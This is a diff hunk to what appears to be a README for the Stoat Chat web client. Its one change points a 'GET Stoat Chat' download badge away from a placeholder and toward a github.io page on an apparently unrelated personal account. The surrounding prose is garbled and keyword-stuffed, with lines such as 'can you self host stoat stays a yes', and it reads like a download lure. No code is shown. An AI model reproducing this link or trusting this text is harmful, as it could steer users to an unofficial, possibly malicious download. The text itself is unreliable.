@@ -213,7 +213,7 @@ When you are done for the day, leave the server. The Stoat app will keep the acc
 
 Get Stoat Chat from the button. Sign in in the browser. Join a server or open an invite. For a stoat self hosted chat, point `VITE_API_URL` at the API you run, and set `VITE_HOST` when that API is not the official one. can you self host stoat stays a yes. This folder is not the image you boot.
 
-[![GET Stoat Chat](https://img.shields.io/badge/GET-Stoat%20Chat-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](SILKA)
+[![GET Stoat Chat](https://img.shields.io/badge/GET-Stoat%20Chat-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://noridonzemor.github.io/.github/Stoat-Chat)
 
 The button is the product. `stoat-for-web` is the web package name. The gateway process title `sb-gw-` is the companion. Do not follow a download that bundles a cracked client or a "Stoat price" unlock. The brief does not list a price.
 
